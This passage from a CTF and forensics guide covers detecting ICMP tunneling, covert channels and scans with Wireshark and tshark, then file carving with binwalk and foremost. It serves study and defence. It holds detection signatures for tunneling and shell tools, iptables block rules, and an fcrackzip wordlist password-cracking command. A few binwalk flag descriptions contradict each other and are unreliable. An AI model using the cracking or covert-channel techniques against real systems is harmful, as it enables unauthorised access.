# High ICMP traffic volume
Statistics > Protocol Hierarchy
Look for abnormal ICMP percentage

# Sequential ICMP with varying data
Filter: icmp.type == 8
Check data field for patterns
```

**Analysis Process**

**Step 1: Identify Suspicious ICMP Traffic**

```
Filter: icmp and data.len > 50
```

**Step 2: Examine ICMP Data Payload**

```
1. Select suspicious ICMP packet
2. Expand "Internet Control Message Protocol" in packet details
3. Expand "Data" section
4. Right-click data field > Copy > Bytes > Hex Stream
```

**Step 3: Extract All ICMP Payloads**

```bash
# Using tshark
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e icmp.data > icmp_data.hex

# Convert hex to binary
cat icmp_data.hex | xxd -r -p > extracted_data.bin

# Or per packet
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e frame.number -e icmp.data
```

**Step 4: Analyze Extracted Data**

```bash
# Check file type
file extracted_data.bin

# Look for text
strings extracted_data.bin

# Search for flags
grep -a "flag" extracted_data.bin

# Check for encoding
cat extracted_data.bin | base64 -d

# Examine hex patterns
xxd extracted_data.bin | less
```

**Step 5: Reconstruct Fragmented Data**

```bash
# Sort by sequence number and concatenate
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields \
  -e icmp.seq -e icmp.data | sort -n | cut -f2 | \
  xxd -r -p > reconstructed.bin
```

**Common ICMP Tunneling Tools**

- ptunnel
- icmptunnel
- ICMPsh
- ICMP-TransferTools

**Tool Signatures to Look For**

```
# ptunnel identifier patterns
icmp.data contains "ptun"

# Consistent packet sizes
# Regular intervals
# Request/reply patterns with data in both directions
```

**Scenario 2: ICMP Tunneling Detection**

**Bidirectional Analysis**

```
# Find ICMP conversations
Statistics > Conversations > IPv4
Filter by ICMP
Look for:
- High packet counts
- Large byte counts  
- Equal request/reply counts with data
```

**Timing Analysis**

```
# View packet timing
View > Time Display Format > Seconds Since Previous Displayed Packet
Filter: icmp

Regular intervals suggest automated tunneling:
0.100000
0.099876
0.100234
```

**Payload Entropy Analysis**

```bash
# Extract payloads
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e icmp.data | \
  xxd -r -p > icmp_payloads.bin

# Calculate entropy (high entropy suggests encrypted/compressed data)
ent icmp_payloads.bin
```

**Normal vs. Tunneled ICMP**

**Normal Ping (Windows)**

```
- Type: 8 (Request), 0 (Reply)
- Data length: 32 bytes
- Data content: Alphabet pattern "abcdefghijklmnopqrstuvwabcdefghi"
- Sequence: Incremental
- Identifier: Constant per session
```

**Normal Ping (Linux)**

```
- Type: 8 (Request), 0 (Reply)
- Data length: 48 bytes (default) or 56 bytes
- Data content: Timestamp + pattern
- Sequence: Incremental
- Identifier: Process ID
```

**Tunneled ICMP Characteristics**

```
- Variable data lengths
- Random-looking data content
- High frequency (many packets per second)
- Similar packet sizes in requests and replies
- Responses contain different data than echo pattern
```

**Scenario 3: ICMP Reconnaissance (Ping Sweeps)**

**Detection Pattern**

```
# Multiple ICMP requests to different hosts
Filter: icmp.type == 8

# From single source to multiple destinations
Statistics > Endpoints > IPv4
Look for single source with many conversations

# Short time window
Check time between first and last packet
```

**Analysis Process**

```bash
# List all pinged hosts
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e ip.dst | sort -u

# Count pings per destination
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e ip.dst | sort | uniq -c

# Timeline
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields \
  -e frame.time -e ip.src -e ip.dst
```

**Identify Live Hosts**

```
# Hosts that responded
Filter: icmp.type == 0

# Extract responding hosts
tshark -r capture.pcap -Y 'icmp.type == 0' -T fields -e ip.src | sort -u
```

**Scenario 4: ICMP Flood (DoS)**

**Detection Indicators**

```
# High ICMP packet rate
Statistics > I/O Graph
Filter: icmp
Adjust interval to 0.1 seconds

# Large ICMP packets (Smurf amplification)
Filter: icmp and frame.len > 1000

# Broadcast pings (Smurf attack pattern)
Filter: icmp.type == 8 and eth.dst == ff:ff:ff:ff:ff:ff
```

**Analysis**

```bash
# Packet rate calculation
tshark -r capture.pcap -Y icmp -T fields -e frame.time_relative | \
  awk '{print int($1)}' | uniq -c

# Source distribution
tshark -r capture.pcap -Y icmp -T fields -e ip.src | sort | uniq -c | sort -rn
```

**Scenario 5: Traceroute Analysis**

**Traceroute Detection**

```
# ICMP-based traceroute (Linux default)
Filter: icmp.type == 11 and icmp.code == 0

# Look for incrementing TTL
Filter: ip.ttl <= 30
Sort by Time, look for TTL pattern: 1,2,3,4...

# UDP-based traceroute (Unix)
Filter: icmp.type == 3 and icmp.code == 3 and udp.port >= 33434
```

**Reconstruct Traceroute Path**

```bash
# Extract path
tshark -r capture.pcap -Y 'icmp.type == 11' -T fields \
  -e ip.ttl -e ip.src | sort -n -k1

# Result shows hop count and router IPs
```

**Windows Traceroute (ICMP Echo)**

```
# Uses ICMP echo requests with incrementing TTL
Filter: icmp.type == 8 and ip.ttl <= 30

# Responses are TTL exceeded messages
Filter: icmp.type == 11
```

**Scenario 6: ICMP Redirect Attack**

**Detection**

```
Filter: icmp.type == 5

# Check redirect gateway
Examine: icmp.redir_gw field
Look for suspicious/unexpected gateway IPs
```

**Analysis**

```bash
# List all redirect messages
tshark -r capture.pcap -Y 'icmp.type == 5' -T fields \
  -e ip.src -e ip.dst -e icmp.redir_gw

# Validate if source is legitimate gateway
# Cross-reference with network topology
```

**Scenario 7: Port Scanning via ICMP**

**ICMP Port Unreachable (UDP scan indicator)**

```
Filter: icmp.type == 3 and icmp.code == 3

# Indicates UDP port scan (closed ports respond with ICMP unreachable)
```

**Analysis**

```bash
# Extract scanned ports
# ICMP unreachable contains original IP/UDP header in payload
tshark -r capture.pcap -Y 'icmp.type == 3 and icmp.code == 3' -V | \
  grep "Destination Port" | sort | uniq -c
```

**Scenario 8: ICMP Shell Detection**

[Inference] ICMP shells embed command/control in ICMP packets.

**Indicators**

```
# Continuous bidirectional ICMP traffic
Filter: icmp
Statistics > Conversations > IPv4

# Look for:
- Sustained request/reply exchange
- Variable data lengths
- High packet count between two hosts
```

**Shell Pattern**

```
Client → Server: ICMP Echo Request (contains command)
Server → Client: ICMP Echo Reply (contains output)
```

**Example Analysis**

```
1. Filter: icmp and ip.addr == [suspicious_ip]
2. Follow ICMP "conversation" chronologically
3. Export data payloads
4. Decode to reveal commands/responses
```

### ICMP Metadata Analysis

**Identifier and Sequence**

```
# Group related pings
icmp.ident

# Track sequence progression icmp.seq

# Normal ping sequence: 1,2,3,4...

# Abnormal: gaps, duplicates, random order

````

**Analyzing Ping Sessions**
```bash
# Extract identifier and sequence pairs
tshark -r capture.pcap -Y 'icmp.type == 8 or icmp.type == 0' -T fields \
  -e frame.number -e icmp.type -e icmp.ident -e icmp.seq -e ip.src -e ip.dst

# Group by identifier
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e icmp.ident | sort | uniq -c

# Detect sequence anomalies
tshark -r capture.pcap -Y 'icmp.ident == 0x1234' -T fields -e icmp.seq | \
  awk '{if(NR==1){prev=$1}else{if($1!=prev+1)print "Gap at seq",prev,"to",$1; prev=$1}}'
````

**TTL Analysis**

```
# Extract TTL values
Filter: icmp
Display column: ip.ttl

# Common default TTLs:
# 64  - Linux/Unix
# 128 - Windows
# 255 - Cisco/Network devices

# Unusual TTL might indicate:
# - Spoofed packets
# - Different OS than expected
# - Packets traversed routers (TTL decremented)
```

**Checksum Validation**

```
# Invalid checksums (potential manipulation)
Filter: icmp.checksum_bad == 1

# Valid checksums
Filter: icmp.checksum_good == 1
```

**Timestamp Analysis**

```
# ICMP timestamp requests/replies
icmp.type == 13  # Timestamp Request
icmp.type == 14  # Timestamp Reply

# Can reveal system time of target
# Examine: icmp.originate_timestamp, icmp.receive_timestamp, icmp.transmit_timestamp
```

### Advanced ICMP Analysis Techniques

**Technique 1: ICMP Data Pattern Recognition**

**Legitimate Ping Patterns**

```bash
# Windows ping pattern (alphabet sequence)
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e icmp.data | head -1
# Expected: 6162636465666768696a6b6c6d6e6f7071727374757677616263646566676869

# Linux ping pattern (timestamp + sequential bytes)
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e icmp.data | head -1
# Expected: timestamp followed by 10 11 12 13 14 15 16 17...
```

**Anomaly Detection**

```bash
# Extract unique data patterns
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e icmp.data | sort -u | wc -l

# If count > 1-2, investigate variations
# Legitimate pings have consistent patterns
# Tunneling/covert channels have varying data
```

**Technique 2: Statistical ICMP Analysis**

**Packet Size Distribution**

```bash
# Distribution of ICMP packet sizes
tshark -r capture.pcap -Y icmp -T fields -e frame.len | sort -n | uniq -c

# Standard sizes:
# 42 bytes: ICMP header only (no data)
# 74 bytes: 32-byte payload (Windows default) + headers
# 90 bytes: 48-byte payload (Linux default) + headers

# Anomalous: Wide variety of sizes
```

**Request/Reply Ratio**

```bash
# Count requests
REQ=$(tshark -r capture.pcap -Y 'icmp.type == 8' | wc -l)

# Count replies
REP=$(tshark -r capture.pcap -Y 'icmp.type == 0' | wc -l)

# Normal: REQ ≈ REP
# Sweep/flood: REQ >> REP
# Amplification: REP >> REQ (if broadcast used)
```

**Timing Patterns**

```bash
# Inter-packet arrival times
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e frame.time_delta_displayed

# Analyze for:
# - Regular intervals (automated tools)
# - Human timing (irregular, > 1 second gaps)
# - Burst patterns (rapid succession)
```

**Technique 3: ICMP Payload Extraction and Analysis**

**Automated Payload Extraction**

```bash
#!/bin/bash
# extract_icmp_data.sh

PCAP="$1"
OUTPUT="icmp_extracted"

mkdir -p "$OUTPUT"

# Extract each ICMP request payload separately
tshark -r "$PCAP" -Y 'icmp.type == 8 and data.len > 0' -T fields \
  -e frame.number -e icmp.seq -e icmp.data | \
while IFS=$'\t' read -r frame seq data; do
    echo "$data" | xxd -r -p > "$OUTPUT/frame_${frame}_seq_${seq}.bin"
done

echo "Extracted ICMP payloads to $OUTPUT/"

# Analyze all extracted files
for file in "$OUTPUT"/*.bin; do
    echo "=== $file ==="
    file "$file"
    strings "$file" | head -5
    echo
done
```

**Payload Concatenation**

```bash
# Concatenate all payloads in sequence order
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields \
  -e icmp.seq -e icmp.data | sort -n | cut -f2 | \
  tr -d '\n' | xxd -r -p > icmp_concatenated.bin

# Check result
file icmp_concatenated.bin
strings icmp_concatenated.bin
hexdump -C icmp_concatenated.bin | less
```

**Technique 4: Detecting ICMP-Based Beaconing**

**Beaconing Characteristics**

```
- Regular time intervals
- Consistent packet sizes
- Continuous over extended period
- Similar data in each packet (or incrementing pattern)
```

**Detection Script**

```bash
#!/bin/bash
# detect_icmp_beaconing.sh

PCAP="$1"

echo "Analyzing ICMP timing patterns..."

# Extract timestamps and calculate intervals
tshark -r "$PCAP" -Y 'icmp.type == 8' -T fields -e frame.time_epoch | \
awk '
NR==1 {prev=$1; next}
{
    interval = $1 - prev
    intervals[int(interval)]++
    prev = $1
}
END {
    print "Interval Distribution (seconds):"
    for (i in intervals) {
        printf "%d seconds: %d occurrences\n", i, intervals[i]
    }
}
' | sort -k1 -n

echo ""
echo "If you see consistent intervals (e.g., every 10 seconds),"
echo "this may indicate beaconing behavior."
```

**Technique 5: ICMP Response Time Analysis**

**Measure Round-Trip Time (RTT)**

```bash
# Extract paired requests/replies and calculate RTT
tshark -r capture.pcap -Y 'icmp' -T fields \
  -e frame.time_epoch -e icmp.type -e icmp.ident -e icmp.seq | \
awk '
{
    key = $3 "_" $4  # identifier_sequence
    if ($2 == 8) {   # Request
        req[key] = $1
    } else if ($2 == 0 && key in req) {  # Reply
        rtt = ($1 - req[key]) * 1000  # Convert to milliseconds
        print "RTT for seq", $4":", rtt, "ms"
        sum += rtt
        count++
    }
}
END {
    if (count > 0) {
        print "Average RTT:", sum/count, "ms"
    }
}
'
```

**RTT Anomaly Detection**

```
# Abnormal RTT patterns may indicate:
- Very low RTT (< 1ms): Local network or same host
- Very high RTT (> 500ms): Long distance, congestion, or artificial delay
- Inconsistent RTT: Variable network conditions or intentional jitter
```

**Technique 6: ICMP Tunneling Protocol Identification**

**Common Tunneling Protocols**

**ptunnel Detection**

```
# ptunnel uses specific magic values
Filter: icmp.data contains "5074756e"  # "Ptun" in hex

# Or search for specific patterns
tshark -r capture.pcap -Y icmp -T fields -e icmp.data | \
  grep -i "5074756e"
```

**icmptunnel Detection**

```bash
# icmptunnel characteristics:
# - Uses ICMP identifier as session ID
# - Data contains protocol headers (TCP/UDP)
# - Consistent data sizes

# Look for IP/TCP headers in ICMP data
tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e icmp.data | \
  grep "^45"  # IPv4 header starts with 0x45
```

**ICMP-TransferTools Detection**

```
# Check for file transfer patterns
# - Sequential data chunks
# - Possible file headers (MZ, PK, etc.)

tshark -r capture.pcap -Y 'icmp.type == 8' -T fields -e icmp.data | \
  head -1 | xxd -r -p | file -
```

**Technique 7: Geolocation via ICMP TTL**

[Inference] TTL analysis can provide approximate distance/hop count to target.

**TTL-based Distance Estimation**

```bash
# Extract TTL from responses
tshark -r capture.pcap -Y 'icmp.type == 0' -T fields -e ip.ttl

# Estimate hop count:
# If TTL = 117, likely started at 128 (Windows)
# Hops = 128 - 117 = 11 hops

# If TTL = 52, likely started at 64 (Linux)
# Hops = 64 - 52 = 12 hops
```

**Common Initial TTL Values**

```
32  - Some embedded systems
64  - Linux, macOS, Unix
128 - Windows
255 - Cisco, network equipment
```

**Technique 8: ICMP Fragmentation Analysis**

**Detecting Fragmented ICMP**

```
Filter: icmp and ip.flags.mf == 1

# Fragmentation is unusual for ICMP
# May indicate:
# - Very large ping payload
# - Fragmentation-based attacks
# - Path MTU issues
```

**Fragment Reassembly**

```bash
# List fragmented packets
tshark -r capture.pcap -Y 'icmp and (ip.flags.mf == 1 or ip.frag_offset > 0)' \
  -T fields -e frame.number -e ip.id -e ip.frag_offset

# Wireshark automatically reassembles
# Check "Reassembled IPv4" in packet details
```

**Technique 9: ICMP Error Message Analysis**

**Extracting Original Headers from ICMP Errors**

ICMP error messages (Type 3, 11, etc.) include the original IP header + 8 bytes of original data.

```
Filter: icmp.type == 3 or icmp.type == 11

# Examine packet details:
- Internet Control Message Protocol
  - Original IP Header
  - Original TCP/UDP Header (partial)
```

**Revealing Blocked Traffic**

```bash
# Find what services were attempted but blocked
tshark -r capture.pcap -Y 'icmp.type == 3 and icmp.code == 13' -V | \
  grep -E "(Destination|Protocol|port)"

# Port unreachable reveals UDP scan targets
tshark -r capture.pcap -Y 'icmp.type == 3 and icmp.code == 3' -V | \
  grep "Destination Port" | sort -u
```

**Technique 10: ICMP Type Distribution Analysis**

**Profile ICMP Usage**

```bash
# Count by type
tshark -r capture.pcap -Y icmp -T fields -e icmp.type | sort | uniq -c

# Expected normal traffic:
# Type 8/0: Most common (ping)
# Type 3: Moderate (unreachable)
# Type 11: Low (traceroute)

# Suspicious:
# High Type 5 (redirects)
# Unusual types (13/14, 17/18, 30)
```

**Visual Analysis**

```
Statistics > Protocol Hierarchy
Expand: Internet Protocol > ICMP
Shows ICMP percentage of total traffic

Statistics > IPv4 Statistics > All Addresses
Look for ICMP-only hosts (potential tunneling endpoints)
```

### ICMP vs ICMPv6

**ICMPv6 Basics**

```
Protocol: 58 (vs ICMP: 1)
Used in IPv6 networks
Different message types and codes
```

**Basic ICMPv6 Filters**

```
icmpv6                        # All ICMPv6
icmpv6.type == 128            # Echo Request
icmpv6.type == 129            # Echo Reply
icmpv6.type == 1              # Destination Unreachable
icmpv6.type == 3              # Time Exceeded
icmpv6.type == 135            # Neighbor Solicitation
icmpv6.type == 136            # Neighbor Advertisement
icmpv6.type == 133            # Router Solicitation
icmpv6.type == 134            # Router Advertisement
```

**ICMPv6-Specific Analysis**

```bash
# ICMPv6 tunneling detection (same principles as ICMP)
tshark -r capture.pcap -Y 'icmpv6.type == 128 and data.len > 100'

# Extract ICMPv6 data
tshark -r capture.pcap -Y 'icmpv6.type == 128' -T fields -e icmpv6.data
```

### ICMP Analysis Tools Beyond Wireshark

**tcpdump for ICMP**

```bash
# Capture only ICMP
sudo tcpdump -i eth0 icmp -w icmp_only.pcap

# Capture with payload (hex)
sudo tcpdump -i eth0 -X icmp

# Filter specific ICMP types
sudo tcpdump -i eth0 'icmp[icmptype] == 8'  # Echo request
sudo tcpdump -i eth0 'icmp[icmptype] == 0'  # Echo reply
sudo tcpdump -i eth0 'icmp[icmptype] == 3'  # Destination unreachable
```

**Scapy for ICMP Analysis**

```python
#!/usr/bin/env python3
from scapy.all import *

# Read pcap
packets = rdpcap('capture.pcap')

# Extract ICMP packets
icmp_packets = [pkt for pkt in packets if ICMP in pkt]

# Analyze ICMP data
for pkt in icmp_packets:
    if pkt[ICMP].type == 8:  # Echo request
        if Raw in pkt:
            data = pkt[Raw].load
            print(f"Seq {pkt[ICMP].seq}: {data[:20]}...")  # First 20 bytes

# Export ICMP payloads
with open('icmp_data.bin', 'wb') as f:
    for pkt in icmp_packets:
        if Raw in pkt:
            f.write(pkt[Raw].load)
```

**Python Script: ICMP Covert Channel Decoder**

```python
#!/usr/bin/env python3
import sys
from scapy.all import rdpcap, ICMP, Raw

def extract_icmp_data(pcap_file):
    """Extract data from ICMP echo requests"""
    packets = rdpcap(pcap_file)
    data_chunks = []
    
    for pkt in packets:
        if ICMP in pkt and pkt[ICMP].type == 8:  # Echo request
            if Raw in pkt:
                data_chunks.append(pkt[Raw].load)
    
    return b''.join(data_chunks)

def analyze_data(data):
    """Analyze extracted data"""
    print(f"[+] Total data extracted: {len(data)} bytes")
    
    # Try to identify file type
    if data.startswith(b'PK'):
        print("[+] Detected: ZIP archive")
    elif data.startswith(b'\x89PNG'):
        print("[+] Detected: PNG image")
    elif data.startswith(b'\xff\xd8\xff'):
        print("[+] Detected: JPEG image")
    elif data.startswith(b'MZ'):
        print("[+] Detected: PE executable")
    elif data.startswith(b'\x7fELF'):
        print("[+] Detected: ELF executable")
    elif data.startswith(b'GIF8'):
        print("[+] Detected: GIF image")
    else:
        print("[+] Unknown file type")
    
    # Check for text
    try:
        text = data.decode('ascii')
        print("[+] Data appears to be ASCII text")
        print(f"[+] First 100 chars: {text[:100]}")
    except:
        print("[-] Data is not ASCII text")
    
    # Check for base64
    try:
        import base64
        decoded = base64.b64decode(data)
        print("[+] Data may be base64 encoded")
        analyze_data(decoded)  # Recursively analyze
    except:
        pass
    
    return data

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <pcap_file> <output_file>")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    output_file = sys.argv[2]
    
    print(f"[*] Extracting ICMP data from {pcap_file}")
    data = extract_icmp_data(pcap_file)
    
    print(f"[*] Analyzing extracted data...")
    analyzed_data = analyze_data(data)
    
    print(f"[*] Writing to {output_file}")
    with open(output_file, 'wb') as f:
        f.write(analyzed_data)
    
    print("[+] Done!")
```

### ICMP Security Best Practices (Defensive Perspective)

**Normal ICMP Traffic Characteristics**

```
- Type 8/0 (ping): Reasonable frequency
- Type 3 (unreachable): Sporadic, legitimate network errors
- Type 11 (TTL exceeded): Occasional traceroutes
- Standard payload sizes (32-48 bytes)
- Predictable data patterns
```

**Suspicious ICMP Indicators**

```
✗ Large payloads (> 100 bytes)
✗ Variable payload content
✗ High frequency (> 10/sec sustained)
✗ Unusual types (5, 13-18, 30)
✗ Regular timing intervals (beaconing)
✗ Bidirectional data exchange
✗ ICMP from unexpected sources
✗ ICMP to/from external IPs (if not expected)
```

**Firewall Rules (Detection Context)**

```bash
# Block ICMP outbound (unusual for clients)
iptables -A OUTPUT -p icmp --icmp-type 8 -j LOG --log-prefix "ICMP-OUT: "

# Rate limit ICMP
iptables -A INPUT -p icmp --icmp-type 8 -m limit --limit 1/s -j ACCEPT

# Block unusual ICMP types
iptables -A INPUT -p icmp --icmp-type 5 -j DROP  # Redirect
iptables -A INPUT -p icmp --icmp-type 13 -j DROP # Timestamp
iptables -A INPUT -p icmp --icmp-type 17 -j DROP # Address mask
```

### ICMP CTF Challenge Patterns

**Pattern 1: Flag in ICMP Data**

```
Multiple ICMP packets contain pieces of flag
Solution: Extract and concatenate payloads in order
```

**Pattern 2: Flag Encoded in Timing**

```
Inter-packet timing encodes binary data
Short interval = 0, Long interval = 1
Solution: Measure timing, convert to bits, decode
```

**Pattern 3: Flag in ICMP Sequence Numbers**

```
Sequence numbers represent ASCII values
Solution: Extract icmp.seq, convert to characters
```

**Pattern 4: Flag in ICMP Identifiers**

```
Different identifier values for each character
Solution: Extract unique identifiers, map to ASCII
```

**Pattern 5: Steganography in ICMP**

```
Flag hidden using LSB in ICMP checksum or data
Solution: Extract checksums/data, perform LSB extraction
```

**Pattern 6: Multi-Layer Encoding**

```
ICMP data is base64 → hex → XOR → flag
Solution: Chain decoding operations
```

### Quick Reference: ICMP Analysis Workflow

**Step 1: Initial Assessment**

```
1. Filter: icmp
2. Check: Statistics > Protocol Hierarchy (% of traffic)
3. Review: Packet list for patterns
```

**Step 2: Type Distribution**

```
1. Statistics > ICMP Type/Code Distribution (if available)
   Or manually: tshark -r capture.pcap -Y icmp -T fields -e icmp.type | sort | uniq -c
2. Identify unusual types
```

**Step 3: Payload Analysis**

```
1. Filter: icmp and data.len > 0
2. Examine data field in packet details
3. Look for patterns, text, encoded data
```

**Step 4: Timing Analysis**

```
1. View > Time Display Format > Seconds Since Previous Displayed Packet
2. Filter: icmp.type == 8
3. Look for regular intervals or anomalies
```

**Step 5: Extraction**

```
1. Extract payloads: tshark -Y 'icmp.type == 8' -T fields -e icmp.data
2. Convert to binary: xxd -r -p
3. Analyze: file, strings, hexdump
```

**Step 6: Correlation**

```
1. Match requests with replies (icmp.ident + icmp.seq)
2. Track conversations
3. Build timeline
```

---

**Related Topics for Further Study**

- **ICMP Rate Limiting and IDS Evasion**: Understanding how attackers bypass detection
- **IPv6 Neighbor Discovery (ICMPv6)**: NDP attacks and analysis
- **ICMP Path MTU Discovery**: Fragmentation and MTU manipulation

---

# File Carving & Extraction

## Binwalk for Embedded Files

### Overview

Binwalk is a firmware analysis tool designed to identify and extract embedded files and executable code from binary images. It uses magic signatures to locate file headers within binary data.

**Primary Use Cases:**

- Firmware image analysis
- Finding hidden files in network captures
- Steganography detection
- Multi-file archive extraction

### Installation

```bash
# Debian/Ubuntu/Kali
apt-get install binwalk

# With extraction dependencies
apt-get install binwalk python3-pip
pip3 install binwalk

# Additional extraction tools
apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full \
cabextract cramfsswap squashfs-tools sleuthkit default-jdk lzop srecord
```

### Basic Usage

**Signature Scan:**

```bash
# Identify embedded files
binwalk file.bin

# Verbose output with additional details
binwalk -v file.bin

# Display invalid results (useful for debugging)
binwalk -I file.bin
```

**Example Output:**

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1920 x 1080, 8-bit/color RGBA
41            0x29            Zlib compressed data, default compression
15856         0x3DF0          JPEG image data, JFIF standard 1.01
```

### Extraction Methods

**Automatic Extraction:**

```bash
# Extract all identified files
binwalk -e file.bin

# Extraction creates directory: _file.bin.extracted/
```

**Manual Extraction (dd method):**

```bash
# Extract from specific offset
binwalk -D 'image:png' file.bin

# Extract specific file type with custom output
dd if=file.bin of=extracted.png bs=1 skip=0 count=15856
```

**Deep Extraction (recursive):**

```bash
# Recursively extract nested archives
binwalk -e -M file.bin

# -M (matryoshka) continues extracting until no more files found
```

**Extract with Preservation:**

```bash
# Preserve original file structure
binwalk -e --preserve-symlinks file.bin

# Run extraction plugins
binwalk -e --run-as=root file.bin  # [Unverified] May be required for certain filesystem extractions
```

### Signature Management

**List Available Signatures:**

```bash
# View all supported file types
binwalk -B

# Common signatures include:
# - Archive formats (zip, tar, gzip, bzip2, 7z, rar)
# - Filesystems (squashfs, cramfs, jffs2, ext2/3/4)
# - Images (png, jpg, gif)
# - Executables (ELF, PE)
# - Compressed data (zlib, lzma)
```

**Custom Signatures:**

Create custom signature file at `~/.config/binwalk/magic`:

```
# Custom magic signature format
0       string      FLAG{       Custom Flag Format
0       string      \x50\x4B    Custom Archive Marker
```

Load custom signatures:

```bash
binwalk -m custom_magic file.bin
```

### Entropy Analysis

**Identify Encrypted/Compressed Sections:**

```bash
# Generate entropy graph
binwalk -E file.bin

# Save entropy plot as PNG
binwalk -E -J file.bin
```

**Entropy Interpretation:**

- **Low entropy (0.0-0.3)**: Repetitive data, zeros, padding
- **Medium entropy (0.4-0.7)**: Structured data, text, code
- **High entropy (0.8-1.0)**: Compressed or encrypted data

**Rising entropy edge**: Indicates start of compressed/encrypted section

### Advanced Techniques

**Raw Compression Scan:**

```bash
# Scan for raw compressed data streams
binwalk -R file.bin

# More aggressive scanning
binwalk -A file.bin
```

**Specific Signature Filtering:**

```bash
# Only search for specific file types
binwalk --include image file.bin
binwalk --include zip file.bin

# Exclude specific types
binwalk --exclude filesystem file.bin
```

**Offset Control:**

```bash
# Start scanning from specific offset
binwalk -o 1024 file.bin

# Scan specific byte range
binwalk -o 1024 -l 4096 file.bin
```

**Hexdump Output:**

```bash
# Display hexdump of identified sections
binwalk -W file.bin

# Extract and hexdump
binwalk -e -W file.bin
```

### Firmware-Specific Analysis

**Filesystem Extraction:**

```bash
# Extract common firmware filesystems
binwalk -e firmware.bin

# Manually mount extracted filesystem
sudo mount -o loop _firmware.bin.extracted/squashfs-root.img /mnt/fw
```

**Kernel/Bootloader Detection:**

```bash
# Identify kernel images
binwalk -y kernel firmware.bin

# Look for U-Boot headers
binwalk firmware.bin | grep -i uboot
```

### CTF-Specific Techniques

**Image Steganography Detection:**

```bash
# Scan image files for hidden data
binwalk image.png

# Extract appended data
binwalk -e image.jpg

# Common hiding locations:
# - After IEND chunk (PNG)
# - After EOF marker (JPEG/GIF)
# - In metadata/EXIF
```

**Polyglot File Analysis:**

```bash
# Files valid as multiple formats
binwalk suspicious.png
# May show: PNG + ZIP + PDF simultaneously

# Extract all embedded formats
binwalk -e -M suspicious.png
```

**Hidden Archive Detection:**

```bash
# Scan for password-protected archives
binwalk file.bin | grep -i encrypted

# Extract for offline cracking
binwalk -e file.bin
fcrackzip -D -p /usr/share/wordlists/rockyou.txt extracted.zip
```

### Performance Optimization

**Speed vs Accuracy:**

```bash
# Fast scan (less accurate)
binwalk -f file.bin

# Thorough scan (slower)
binwalk -A -R file.bin

# Multi-threaded extraction
binwalk -e --threads=4 file.bin
```

**Memory-Mapped Files:**

```bash
# For large files, use memory mapping
binwalk -M large_file.bin
```

### Common Issues and Solutions

**Issue 1: Extraction Failures**

```bash
# Dependency check
binwalk -h | grep -A20 "Supported"

# Manual extraction
binwalk file.bin  # Note offset
dd if=file.bin of=manual.zip bs=1 skip=[offset]
```

**Issue 2: False Positives**

```bash
# Reduce false positives
binwalk -f -I file.bin

# Validate extracted files
file _file.bin.extracted/*
```

**Issue 3: Incomplete Extraction**

```bash
# Deep recursive extraction
binwalk -e -M --max-size=0 file.bin

# Manual iteration
binwalk -e file.bin
cd _file.bin.extracted
binwalk -e *
```

### Scripting with Binwalk

**Python API Usage:**

```python
#!/usr/bin/env python3
import binwalk

# Scan file
for module in binwalk.scan('file.bin', signature=True, quiet=True):
    print(f"[*] {module.name}")
    for result in module.results:
        print(f"    {result.offset:#x}: {result.description}")

# Extract files
binwalk.scan('file.bin', signature=True, extract=True)
```

**Batch Processing:**

```bash
#!/bin/bash
# Process multiple files
for file in *.bin; do
    echo "[*] Processing $file"
    binwalk -e "$file"
    echo "[+] Extracted to _${file}.extracted/"
done
```

## Foremost File Recovery

### Overview

Foremost is a forensic file recovery tool that uses header/footer detection and data structures to carve files from disk images or binary data. Originally developed by the US Air Force Office of Special Investigations.

### Installation

```bash
# Debian/Ubuntu/Kali (usually pre-installed)
apt-get install foremost

# Verify installation
foremost -V
```

### Configuration File

**Default Configuration:** `/etc/foremost.conf`

**Configuration Format:**

```
# Format: extension  case  size  header  footer  [REVERSE]

# Common pre-configured types:
jpg  y  200000000  \xff\xd8\xff\xe0\x00\x10  \xff\xd9
gif  y  5000000    \x47\x49\x46\x38  \x00\x3b
png  y  20000000   \x89\x50\x4e\x47  \xff\xfc\xfd\xfe
pdf  y  5000000    \x25\x50\x44\x46  \x25\x45\x4f\x46
zip  y  50000000   \x50\x4b\x03\x04
```

**Custom Configuration Example:**

```bash
# Create custom config
cat > custom.conf << 'EOF'
# Custom file signatures
txt  n  100000     flag{                     }
key  n  5000       -----BEGIN PRIVATE KEY    -----END PRIVATE KEY
pcap n  100000000  \xd4\xc3\xb2\xa1
EOF
```

### Basic Usage

**Simple File Carving:**

```bash
# Carve from binary file
foremost -i file.bin -o output_dir/

# Specify output directory (required)
foremost -t all -i disk.img -o recovered/
```

**Output Structure:**

```
output_dir/
├── audit.txt          # Recovery log with offsets
├── jpg/               # Recovered JPEG files
├── png/               # Recovered PNG files
├── pdf/               # Recovered PDF files
└── zip/               # Recovered ZIP archives
```

### File Type Selection

**Carve Specific Types:**

```bash
# Single type
foremost -t jpg -i file.bin -o output/

# Multiple types
foremost -t jpg,png,pdf -i file.bin -o output/

# All supported types
foremost -t all -i file.bin -o output/
```

**Supported Types (default):**

- jpg, gif, png, bmp
- avi, mpg, wav, wmv, mov
- zip, rar, htm, cpp, doc, xls, ppt
- pdf, ole, exe

### Advanced Options

**Custom Configuration:**

```bash
# Use custom config file
foremost -c custom.conf -i file.bin -o output/

# Override default config
foremost -c /path/to/custom.conf -t all -i data.bin -o carved/
```

**Block Size Control:**

```bash
# Set block size (default: 512 bytes)
foremost -b 4096 -i file.bin -o output/

# Smaller blocks = slower but more thorough
foremost -b 64 -i file.bin -o output/
```

**Verbose Output:**

```bash
